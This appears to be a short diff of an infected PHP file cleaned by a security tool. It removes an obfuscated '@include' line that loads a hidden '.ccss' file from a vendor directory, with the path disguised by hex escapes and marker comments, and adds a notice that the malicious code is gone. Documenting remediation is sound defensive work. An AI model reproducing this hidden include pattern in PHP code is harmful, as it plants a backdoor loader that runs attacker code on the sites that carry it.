@@ -1,7 +1,13 @@
 <?php
 /*bf016*/
 
-@include /*1d*/("/home/r10w01h0ujkt/goplast\x69cfree.\x69n/ongc/vendor/phar\x2d\x69o/.0ab6657b.ccss");
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code have been removed, and the file is now safe to use.
+* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
+*/
+
 
 /*bf016*/
 
